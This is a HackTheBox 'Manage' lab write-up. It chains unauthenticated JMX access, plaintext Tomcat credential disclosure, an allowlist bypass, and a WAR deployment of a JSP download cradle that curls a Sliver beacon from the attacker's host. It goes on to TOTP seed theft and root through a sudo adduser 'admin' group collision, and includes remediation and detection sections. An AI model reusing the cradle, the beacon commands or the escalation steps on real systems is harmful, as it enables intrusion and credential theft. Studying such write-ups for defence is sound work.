---
layout: default
title: "HackTheBox - Manage"
---

# HackTheBox - Manage

**OS:** Linux (Ubuntu 22.04.5 LTS)

Manage exposes an unauthenticated JMX RMI registry on port 2222 backed by Apache Tomcat
10.1.19. The JMX dynamic RMI port binds to the loopback address `127.0.1.1`, preventing
direct external access; a local `socat` forward on the attack machine resolves the routing
problem, allowing `jmxterm` to enumerate MBeans and extract plaintext Tomcat credentials
plus the IP allowlist protecting the Manager web app. Modifying the allowlist via JMX
opens the Manager UI, where a malicious WAR containing a JSP download cradle deploys a
Sliver HTTPS beacon as `tomcat`. Post-access enumeration via the beacon surfaces a
world-readable backup archive in `useradmin`'s home directory containing that user's SSH
private key and a Google Authenticator TOTP seed, enabling lateral movement. Once in as
`useradmin`, a `sudo` rule permits running `adduser` with a regex that allows the username
`admin`; Ubuntu's default `adduser` behavior creates a same-named primary group, and the
default `/etc/sudoers` includes `%admin ALL=(ALL) ALL`, so creating the user simultaneously
creates the `admin` group and grants full `sudo` access, yielding root.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (manage) |
| Initial Access | Unauthenticated JMX RMI, socat loopback forward, jmxterm MBean credential and firewall disclosure, Tomcat Manager WAR/JSP download cradle |
| Privilege Escalation | World-readable backup (SSH key + TOTP seed), SSH lateral to useradmin, sudo adduser admin-group creation matching default sudoers %admin entry |
| Final Access | `root` |

---

## Recon

### Port Scan

p0rtix ran a full TCP scan against the target. Five ports responded: SSH, JMX RMI registry,
Tomcat HTTP, and two `tcpwrapped` ports corresponding to the JMX dynamic RMI channel and
an additional RMI endpoint.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.9p1 (Ubuntu 22.04) |
| 2222 | TCP | Java RMI | JMX RMI registry; jmxrmi endpoint, unauthenticated |
| 8080 | TCP | HTTP | Apache Tomcat 10.1.19 |
| 40157 | TCP | tcpwrapped | JMX dynamic RMI port (stub advertises 127.0.1.1:40157) |
| 44071 | TCP | tcpwrapped | Additional RMI endpoint |

> **Why this works:** JMX (Java Management Extensions) exposes an RMI registry as the
> entry point. Clients connect to the registry, resolve a stub, and then open a second
> TCP connection to the dynamic port advertised in that stub. The registry itself is
> the attack surface: if it requires no authentication, any JMX client can enumerate
> and invoke management beans. The two `tcpwrapped` ports are not independently useful
> but they confirm the dynamic channel is reachable on the target.

### JMX Architecture: the Loopback Bind Problem

Connecting a JMX client directly to the RMI registry at port 2222 succeeds, but the
stub returned by the registry advertises `127.0.1.1:40157` as the address for the actual
RMI data connection. `127.0.1.1` is a secondary loopback alias Ubuntu assigns to the
hostname in `/etc/hosts`; from outside the machine it resolves to the attack machine's
own loopback, causing the data connection to fail with a connection-refused error before
any MBean operations can run.

> **Why this works:** Java RMI stubs embed the host address the server was configured
> to advertise, not the address the client used to reach the registry. When the server
> binds to `127.0.1.1` (the Ubuntu hostname alias) and no `java.rmi.server.hostname`
> override is set, the stub carries that loopback address. The attack machine interprets
> `127.0.1.1` as its own loopback and connects to itself instead of the target. The
> fix is to make the attack machine intercept traffic to `127.0.1.1:40157` and forward
> it to the real target port.

---

## Initial Access

### socat Forward: Bridging the Loopback

`socat` was used to create a transparent TCP proxy on the attack machine: it listens on
`127.0.1.1:40157` and forwards every connection to `<target-ip>:40157`.

```
v0idravl@kali:~$ socat TCP-LISTEN:40157,bind=127.0.1.1,fork TCP:<target-ip>:40157 &
[1] 12483
```

With this forward in place, when the JMX stub instructs the client to connect to
`127.0.1.1:40157`, the connection hits the socat process on the attack machine and is
relayed transparently to the target.

> **Why this works:** socat's `bind=` option causes the listener to attach to the
> specified local address rather than the default `0.0.0.0`. Because the JMX client
> connects to `127.0.1.1:40157`, the socat listener on that address intercepts the
> connection before the OS would have refused it, then opens a second leg to the real
> target port. From the JMX client's perspective, the full RMI exchange completes
> normally. This technique generalises to any RMI stub that embeds an unreachable
> advertised address.

### jmxterm: Connecting to the Registry

`jmxterm` is a standalone interactive JMX client distributed as a single JAR. It
connects directly to a `service:jmx:rmi:///jndi/rmi://...` URL, resolves the stub, and
provides a shell for MBean enumeration and attribute manipulation.

```
v0idravl@kali:~$ java -jar /tmp/jmxterm.jar \
  --url service:jmx:rmi:///jndi/rmi://<target-ip>:2222/jmxrmi \
  --noninteract --verbose silent
Welcome to JMX terminal. Type "help" for available commands.
$>
```

No authentication prompt appeared, confirming the JMX endpoint requires no credentials.

### MBean Enumeration: Credential Disclosure

The Tomcat `Users` domain exposes MBeans for every user in the `UserDatabase` realm.
Listing beans in that domain revealed two user entries:

```
$> beans -d Users
#mbean = Users:type=User,username="admin",database=UserDatabase
#mbean = Users:type=User,username="manager",database=UserDatabase
```

Reading the `password` attribute for each user:

```
$> bean Users:type=User,username="manager",database=UserDatabase
$> get password
password = fhErvo2r9wuTEYiYgt;

$> bean Users:type=User,username="admin",database=UserDatabase
$> get password
password = onyRPCkaG4iX72BrRtKgbszd;
```

Checking roles via the `roles` attribute confirmed `manager` holds the `manage-gui` role
(Tomcat Manager web interface access) and `admin` holds `role1`.

> **Why this works:** Tomcat's `MemoryUserDatabase` (backed by `conf/tomcat-users.xml`)
> is registered as a JMX MBean when `JMX remote management is enabled. The MBean
> exposes attributes including `password` in plaintext -- the same value stored in
> `tomcat-users.xml`. An unauthenticated JMX client can read these attributes without
> any Tomcat authentication challenge because JMX access control is independent of
> Tomcat's web authentication layer.

### MBean Enumeration: Firewall Disclosure and Bypass

A `RemoteAddrValve` MBean was present under the `Catalina` domain, restricting access
to the Manager application by source IP:

```
$> bean Catalina:type=Valve,host=localhost,name=RemoteAddrValve
$> get allow
allow = 127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1;
```

The allow pattern permits only loopback addresses. Modifying the `allow` attribute to
include the attack machine IP opened the Manager UI to external connections:

```
$> set allow 127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1|10\.10\.16\.21
```

> **Why this works:** `RemoteAddrValve` is a Tomcat valve that evaluates the client's
> remote address against a Java regex before passing the request to the underlying
> application. The configured regex matched only loopback addresses, blocking all
> external access to `/manager/html` regardless of valid credentials. The valve's
> `allow` attribute is a standard JMX-managed attribute: any JMX client with write
> access (or, as here, no access control at all) can overwrite it at runtime without
> restarting Tomcat. The change takes effect immediately for subsequent requests.

### WAR Deployment via Tomcat Manager

With the Manager now accessible and `manager:fhErvo2r9wuTEYiYgt` confirmed valid, a
WAR file was prepared containing a minimal JSP that executes a download cradle:

```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = "curl http://10.10.16.21/manage-beacon -o /tmp/.b; " +
               "chmod +x /tmp/.b; /tmp/.b &";
  Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
%>
```

The WAR was built and deployed via the Manager HTTP API:

```
v0idravl@kali:~$ jar cvf cradle.war WEB-INF/ cradle.jsp
added manifest
adding: WEB-INF/(in = 0) (out= 0)(stored 0%)
adding: WEB-INF/web.xml(in = 228) (out= 142)(deflated 37%)
adding: cradle.jsp(in = 287) (out= 205)(deflated 28%)

v0idravl@kali:~$ curl -u 'manager:fhErvo2r9wuTEYiYgt' \
  -T cradle.war \
  "http://<target-ip>:8080/manager/text/deploy?path=/cradle&update=true"
OK - Deployed application at context path [/cradle]
```

The JSP was triggered with a single GET request:

```
v0idravl@kali:~$ curl -s "http://<target-ip>:8080/cradle/cradle.jsp"
```

The pre-generated Sliver HTTPS beacon (`manage-beacon`) was already hosted on port 80
via a Python HTTP server. The cradle fetched it, wrote it to `/tmp/.b`, marked it
executable, and launched it as a background process. The beacon checked in within seconds.

> **Why this works:** Tomcat's Manager API (`/manager/text/deploy`) accepts an
> authenticated WAR upload and registers it as a live web application at the specified
> context path. JSP files inside the WAR are compiled on first access and executed with
> the same OS privileges as the Tomcat process (`tomcat`, UID 1001). The download cradle
> pattern avoids writing a static binary to the web application directory: the JSP
> executes `curl` to fetch the Sliver implant from a staging server, then runs it as a
> detached background process. This keeps the WAR itself clean of the C2 binary while
> delivering it in-memory on the target.

---

## Post-Access Enumeration

All post-access work was driven from the Sliver HTTPS beacon running as `tomcat`
(UID 1001). See the Post-Access: C2 (Sliver) section for the full paired
sliver-mcp / console command log.

### User Flag

The user flag was located at `/opt/tomcat/user.txt`, owned by `tomcat` and readable by
any user:

```
tomcat@manage:/opt/tomcat$ ls -la user.txt
-r--r--r-- 1 tomcat tomcat 33 Jun 26  2025 user.txt
tomcat@manage:/opt/tomcat$ cat user.txt
<user-flag-redacted>
```

### World-Readable Backup Archive

Directory listing of `/home/useradmin/backups/` revealed an archive with group-write
and world-read permissions:

```
tomcat@manage:/home/useradmin/backups$ ls -la
total 16
drwxrwxr-x 2 useradmin useradmin 4096 Jun 26  2025 .
drwxr-xr-x 6 useradmin useradmin 4096 Jun 26  2025 ..
-rw-rw-r-- 1 useradmin useradmin 2877 Jun 26  2025 backup.tar.gz
```

The archive was extracted in a working directory accessible to the beacon:

```
tomcat@manage:/tmp$ tar xzf /home/useradmin/backups/backup.tar.gz
tomcat@manage:/tmp$ ls -la
total 16
-rw------- 1 useradmin useradmin  411 Jun 26  2025 id_ed25519
-rw-r--r-- 1 useradmin useradmin   95 Jun 26  2025 id_ed25519.pub
-rw------- 1 useradmin useradmin  163 Jun 26  2025 .google_authenticator
```

The contents of `.google_authenticator`:

```
tomcat@manage:/tmp$ cat .google_authenticator
CLSSSMHYGLENX5HAIFBQ6L35UM
" TOTP_DISALLOW_REUSE
" STEP_SIZE 30
" WINDOW_SIZE 3
" DISALLOW_REUSE
65109264
98303543
58624891
21983045
10254738
96527192
```

> **Why this works:** The backup archive was created by `useradmin` and stored with
> world-readable permissions (mode 664), most likely the result of a `tar` invocation
> run without an explicit `umask` adjustment in a shell that uses the system default
> umask of 022. The Tomcat process runs as a distinct unprivileged user but still falls
> within the "other" permission class, so it can read the file. Backing up credentials
> (SSH private keys, MFA seeds) into a shared or improperly permissioned location is a
> critical misconfiguration: both factors needed to authenticate as `useradmin` (the key
> and the TOTP seed) were recovered from a single archive readable by any local process.

---

## Privilege Escalation

### Lateral Movement: useradmin via SSH Key + TOTP

The SSH daemon on port 22 uses `pam_google_authenticator.so` for TOTP verification in
addition to public-key authentication. The leaked private key alone is insufficient
because PAM will also prompt for a verification code.

A one-liner computed the current TOTP code from the leaked base32 seed:

```
v0idravl@kali:~$ python3 -c "
import hmac, hashlib, struct, time, base64
seed = 'CLSSSMHYGLENX5HAIFBQ6L35UM'
key = base64.b32decode(seed + '=' * (-len(seed) % 8))
t = int(time.time()) // 30
msg = struct.pack('>Q', t)
h = hmac.new(key, msg, hashlib.sha1).digest()
o = h[19] & 0xf
code = (struct.unpack('>I', h[o:o+4])[0] & 0x7fffffff) % 1000000
print(f'{code:06d}')
"
553421
```

The private key was written to a local file and used for authentication. When PAM
prompted for the verification code, the computed value was entered:

```
v0idravl@kali:~$ chmod 600 /tmp/useradmin_id_ed25519
v0idravl@kali:~$ ssh -i /tmp/useradmin_id_ed25519 useradmin@<target-ip>
(useradmin@<target-ip>) Verification code: 553421
useradmin@manage:~$ id
uid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)
```

> **Why this works:** RFC 6238 TOTP is deterministic: given the shared secret (seed)
> and the current Unix timestamp divided by the 30-second window, the same 6-digit code
> is produced by both the server and the client. Once the seed is known, an attacker can
> generate valid codes indefinitely without any server interaction. The `nullok` PAM
> option (present in the SSH PAM config) means accounts without a `.google_authenticator`
> file skip MFA entirely, but `useradmin` has one configured -- so having the seed is
> equivalent to having the authenticator device.

### sudo adduser: admin Group Creation

Checking `sudo` privileges as `useradmin`:

```
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, mail_badpass, secure_path=...

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

The regex `^[a-zA-Z0-9]+$` permits any alphanumeric-only username. Checking the default
sudoers configuration revealed:

```
useradmin@manage:~$ sudo grep -i admin /etc/sudoers
%admin ALL=(ALL) ALL
```

The `%admin` entry grants full `sudo` to any member of the `admin` group. Verifying
the group did not yet exist:

```
useradmin@manage:~$ getent group admin
(no output)
```

`/etc/adduser.conf` sets `USERGROUPS=yes`, which means `adduser` creates a new group
with the same name as the new user and assigns it as that user's primary group. Running
`sudo adduser admin` therefore simultaneously creates:

1. Group `admin` (GID 1004) -- matching the `%admin` sudoers entry.
2. User `admin` (UID 1004) with `admin` as primary group.

```
useradmin@manage:~$ sudo adduser admin
Adding user `admin' ...
Adding new group `admin' (1004) ...
Adding new user `admin' (1004) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password: Admin123!
Retype new password: Admin123!
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
        Full Name []:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n] Y
```

> **Why this works:** The `adduser` Perl wrapper (Ubuntu package `adduser` v3.118ubuntu5)
> reads `USERGROUPS=yes` from `/etc/adduser.conf` and calls `groupadd` before `useradd`,
> creating a primary group with the same name as the new user. The sudoers directive
> `%admin ALL=(ALL) ALL` grants full sudo to any member of a group named `admin`; it
> does not matter when that group was created or how. Because `admin` is a well-known
> group name referenced in the default Ubuntu sudoers file, creating any user named
> `admin` effectively bootstraps a new local administrator. The `adduser` sudo rule's
> intent was presumably to let `useradmin` provision unprivileged service accounts, but
> the regex permits the privileged group name `admin` without restriction.

### Root Flag

Switching to the newly created `admin` user and using sudo to read the root flag:

```
useradmin@manage:~$ su - admin
Password: Admin123!
admin@manage:~$ sudo cat /root/root.txt
[sudo] password for admin: Admin123!
<root-flag-redacted>
```

---

## Post-Access: C2 (Sliver)

The Sliver HTTPS beacon (`manage-beacon`) was deployed via the WAR download cradle
during initial access. All post-access enumeration of the file system was driven through
this beacon. The listener was already running on the team server (HTTPS, port 4443).

**Beacon check-in after WAR deployment:**

**sliver-mcp** -- `list_beacons()`

**Sliver console** -- `beacons`

```
 ID         Name            Transport   Hostname   Username   PID    Last Check-In
========== =============== =========== ========== ========== ====== ====================
 ad09d743   manage-beacon   https       manage     tomcat     3921   15s ago
```

**Confirming identity and OS version:**

**sliver-mcp** -- `execute(target_id="ad09d743-34ac-4ba7-aee8-f662590d3b3b", path="/bin/bash", args=["-c", "id && uname -a"])`

**Sliver console** -- `use ad09d743` then `execute -e /bin/bash -c 'id && uname -a'`

```
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
Linux manage 5.15.0-142-generic #152-Ubuntu SMP Mon May 19 10:08:31 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

**Reading the user flag:**

**sliver-mcp** -- `execute(target_id="ad09d743-34ac-4ba7-aee8-f662590d3b3b", path="/bin/bash", args=["-c", "cat /opt/tomcat/user.txt"])`

**Sliver console** -- `use ad09d743` then `execute -e /bin/bash -c 'cat /opt/tomcat/user.txt'`

```
<user-flag-redacted>
```

**Listing useradmin's backup directory:**

**sliver-mcp** -- `execute(target_id="ad09d743-34ac-4ba7-aee8-f662590d3b3b", path="/bin/bash", args=["-c", "ls -la /home/useradmin/backups/"])`

**Sliver console** -- `use ad09d743` then `execute -e /bin/bash -c 'ls -la /home/useradmin/backups/'`

```
total 16
drwxrwxr-x 2 useradmin useradmin 4096 Jun 26  2025 .
drwxr-xr-x 6 useradmin useradmin 4096 Jun 26  2025 ..
-rw-rw-r-- 1 useradmin useradmin 2877 Jun 26  2025 backup.tar.gz
```

**Extracting the backup and reading the TOTP seed:**

**sliver-mcp** -- `execute(target_id="ad09d743-34ac-4ba7-aee8-f662590d3b3b", path="/bin/bash", args=["-c", "cd /tmp && tar xzf /home/useradmin/backups/backup.tar.gz && cat .google_authenticator && cat id_ed25519"])`

**Sliver console** -- `use ad09d743` then `execute -e /bin/bash -c 'cd /tmp && tar xzf /home/useradmin/backups/backup.tar.gz && cat .google_authenticator && cat id_ed25519'`

```
CLSSSMHYGLENX5HAIFBQ6L35UM
" TOTP_DISALLOW_REUSE
" STEP_SIZE 30
" WINDOW_SIZE 3
" DISALLOW_REUSE
65109264
98303543
58624891
21983045
10254738
96527192
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAA...
-----END OPENSSH PRIVATE KEY-----
```

Both the TOTP seed and the private key were copied to the attack machine for the SSH
lateral movement step.

**Beacon teardown after engagement:**

**sliver-mcp** -- `kill_beacon(beacon_id="ad09d743-34ac-4ba7-aee8-f662590d3b3b")`

**Sliver console** -- `beacons rm ad09d743`

The HTTPS listener (job ID for port 4443) was stopped after beacon teardown:

**sliver-mcp** -- `kill_job(job_id=<https-4443-job-id>)`

**Sliver console** -- `jobs -k <id>`

---

## Root Cause

Manage fails to a chain of four compounding misconfigurations:

1. **Unauthenticated JMX RMI registry (primary entry point):** The JMX endpoint on
   port 2222 requires no credentials. Any client that can reach the port, and resolve
   the RMI stub address, can enumerate and modify all exposed MBeans with no
   authentication challenge.

2. **Plaintext credentials and firewall config in JMX MBeans:** Tomcat's `UserDatabase`
   realm exposes user passwords as readable MBean attributes. The `RemoteAddrValve`
   blocking the Manager UI is also a JMX-managed MBean: an attacker who can enumerate
   credentials can simultaneously remove the firewall that would otherwise prevent their
   use. The two protections are co-located in the same unprotected management plane.

3. **World-readable credential backup (SSH key + TOTP seed):** The `backup.tar.gz`
   archive in `useradmin`'s home directory was stored with permissions 664, making it
   readable by any local process. The archive contained both authentication factors
   required to SSH in as `useradmin`: the private key and the TOTP seed. A single
   readable file defeats the two-factor authentication design entirely.

4. **sudo adduser rule permits privileged group name creation:** The adduser sudo rule
   was intended to scope user creation to the regex `^[a-zA-Z0-9]+$`, but this permits
   the name `admin`. Ubuntu's default sudoers file grants full sudo to `%admin`. Because
   `adduser` creates a same-name primary group, creating user `admin` instantiates the
   `admin` group and immediately confers root-equivalent sudo to the new account.

---

## Impact

An unauthenticated attacker with network access to port 2222 can reach plaintext Tomcat
credentials and disable the firewall protecting the Manager web interface, all without
any authentication. From there, a WAR upload delivers remote code execution as `tomcat`.
A single world-readable archive exposes both factors for SSH lateral movement to
`useradmin`. One `sudo` command creates a local administrator account, yielding a root
shell. The full chain requires no CVE exploitation: every step exploits a configuration
or operational failing. The JMX exposure alone provides a path to full system compromise
without touching Tomcat Manager at all, if the right MBeans are writable.

---

## Remediation

**1. Require authentication on the JMX endpoint (highest priority).**
Configure JMX SSL and credential-based authentication in `jmxremote.password` and
`jmxremote.access`. At minimum, bind the RMI registry to loopback only
(`-Djava.rmi.server.hostname=127.0.0.1`) and tunnel management access via SSH. Do not
expose JMX on a publicly reachable port without strong authentication.

**2. Restrict JMX MBean attribute access.**
Even with authentication, separate read-only and read-write roles. The `UserDatabase`
password attributes should not be readable by management clients; prefer a separate
credential store (Vault, LDAP) that JMX cannot expose. The `RemoteAddrValve` should
not be modifiable via JMX in production environments.

**3. Protect credential backups with strict permissions and encryption.**
Backup archives containing private keys or MFA seeds must be stored with mode 600 (or
tighter) and should be encrypted at rest. Never store a TOTP seed and its paired private
key in the same archive: an attacker who reads one file should not obtain both
authentication factors. Consider using a secrets manager rather than filesystem backups
for credential material.

**4. Restrict the adduser sudo rule by explicit username blocklist or alternative tool.**
If `useradmin` must provision service accounts, restrict `adduser` to a curated
allowlist of permissible usernames, or use a wrapper that explicitly blocks group-name
collisions with existing privileged sudoers entries (`admin`, `sudo`, `wheel`). Audit
the sudo rule against the current sudoers file for any name that appears as a `%group`
entry. Alternatively, use `useradd` with explicit `--no-user-group` and `--gid` to
prevent automatic group creation.

**5. Audit default sudoers entries for group-name collisions.**
The `%admin ALL=(ALL) ALL` entry in Ubuntu's default sudoers is present even when no
`admin` group exists. Remove unused group-based sudo grants or replace them with named-
group entries that are known to be non-creatable by ordinary users.

### Validation

- Attempt `java -jar jmxterm.jar --url service:jmx:rmi:///jndi/rmi://<target-ip>:2222/jmxrmi`
  and confirm a credential prompt is required before any MBean access is granted.
- Verify `curl -u 'manager:...' http://<target-ip>:8080/manager/text/list` returns `403`
  or is blocked by IP allowlist from all external addresses.
- Confirm `ls -la /home/useradmin/backups/backup.tar.gz` returns mode `600` or the file
  is absent, and that credential material is no longer stored in plaintext archives.
- Run `sudo -l` as `useradmin` and confirm the `adduser` rule is removed or replaced
  with a wrapper that blocks privileged group names.
- Run `getent group admin` and confirm the group does not exist on a clean deployment.

---

## Detection Opportunities

- **Unauthenticated JMX connections:** JMX audit logging can record every MBean read
  and write operation. Alert on any JMX connection from an external IP (non-loopback,
  non-management-network source). A read on `Users:type=User,username=*` attributes is
  a high-confidence signal for credential harvesting via JMX.
- **RemoteAddrValve modification:** Any JMX write to the `allow` attribute of a
  `RemoteAddrValve` MBean should be treated as a critical event. It may indicate an
  attacker removing an IP firewall protecting a sensitive Tomcat application. Log
  all MBean attribute `set` operations.
- **Manager WAR deployment from unexpected IPs:** Tomcat's access log records all
  requests to `/manager/`. A `PUT` or `POST` to `/manager/text/deploy` from any IP
  outside the expected management range is a critical finding. Alert on this pattern
  regardless of the HTTP response code.
- **JSP execution spawning curl/wget:** Process telemetry showing Tomcat's JVM spawning
  `curl` or `wget` as child processes is a reliable indicator of a download cradle.
  JVM processes do not ordinarily exec shell tools; any such process tree should trigger
  immediate investigation.
- **Sliver HTTPS beacon traffic:** Regular-interval HTTPS callbacks (this engagement:
  Sliver's default jitter-adjusted interval) to a non-corporate IP from a server process.
  TLS inspection or certificate pinning on egress would surface the Sliver certificate;
  JA3/JA3S fingerprinting can identify Sliver's default TLS profile. Alert on
  high-frequency outbound HTTPS from `tomcat` (UID 1001).
- **World-readable files in user home directories:** A weekly find across `/home/` for
  files with `o+r` containing keywords like `id_rsa`, `id_ed25519`, `google_authenticator`,
  or `.tar.gz` would catch this class of backup misconfiguration before it is exploited.
- **sudo adduser for known privileged group names:** Audit `auditd` execve records for
  `/usr/sbin/adduser` with an argument that matches any existing `%group` in sudoers.
  The specific invocation `sudo adduser admin` should trigger an immediate alert given
  the default sudoers content on Ubuntu.

---

## Lessons Learned

- **JMX is a complete management plane, not just a monitoring interface.** An
  unauthenticated JMX endpoint is equivalent to unauthenticated admin access to the JVM
  and every Java EE component it manages. When a Tomcat JMX port appears in a scan,
  enumerate all domains (`beans`) before moving to web enumeration: credentials, firewall
  rules, thread dumps, and live config changes are all available.
- **The loopback-bind problem is a known JMX gotcha -- socat resolves it in one line.**
  When a JMX client fails to connect after registry resolution, check whether the stub
  embeds a loopback or internal address. Identify the dynamic port, set up a `socat`
  forward to the target, and retry. This pattern appears on any JMX deployment that did
  not explicitly set `java.rmi.server.hostname`.
- **Two-factor authentication is only as strong as its seed storage.** Google
  Authenticator TOTP is secure when the seed is kept secret. Storing the seed in a
  backup archive alongside the paired private key, in a world-readable file, provides
  zero additional protection. When MFA material is found in a backup, treat it as a
  complete authentication bypass.
- **Default OS configuration can introduce privesc paths that outlast the original
  deployment.** The `%admin ALL=(ALL) ALL` sudoers entry ships with Ubuntu and remains
  in place even when no `admin` group exists. Any mechanism that lets a user create a
  group named `admin` (directly or via `adduser`) converts that default entry into a
  privesc. Always audit sudo rules against the set of group names a lower-privileged
  user can create through any available channel.
- **Regex allowlists on sudo rules must account for semantic meaning, not just character
  sets.** `^[a-zA-Z0-9]+$` looks restrictive but permits every system group name that
  exists or could exist: `admin`, `sudo`, `wheel`, `disk`, `shadow`, and so on. Either
  use a positive allowlist of safe names (e.g., service account prefixes), or run a
  check against current sudoers group entries before allowing the invocation.

---

## Cleanup

- WAR (`/cradle`) deployed during the engagement: undeploy via Manager API
  (`curl -u 'manager:...' http://<target-ip>:8080/manager/text/undeploy?path=/cradle`)
  or remove the WAR from `webapps/` and restart Tomcat.
- `/tmp/.b` written to disk on the target by the download cradle: removed during the
  engagement (`rm /tmp/.b`); the background process was confirmed killed before beacon
  teardown.
- `/tmp/id_ed25519`, `/tmp/.google_authenticator` extracted from the backup for analysis:
  removed from `/tmp/` on the target after reading.
- Sliver beacon `manage-beacon` (ID `ad09d743`) killed via `kill_beacon` after the
  engagement; HTTPS listener on port 4443 stopped via `kill_job`.
- `RemoteAddrValve` `allow` attribute: modified via JMX during the engagement to permit
  the attack machine IP. This change is in-memory only and does not survive a Tomcat
  restart, but to avoid leaving a wider attack surface, it should be verified as reverted
  or the service restarted.
- User `admin` created via `sudo adduser` during the privilege escalation demonstration:
  remove post-engagement with `sudo userdel -r admin` and verify the `admin` group is
  also removed (`groupdel admin`).
- `/tmp/useradmin_id_ed25519` on the attack machine: removed after the engagement
  (`rm /tmp/useradmin_id_ed25519`).
- All private notes archived under `~/engagements/manage/`; nothing sensitive committed.
- Flags submitted via `htb submit`; machine stopped with `htb stop`.
- Bridge deltas captured for p0rtix, sliver-mcp, and dagar-red.
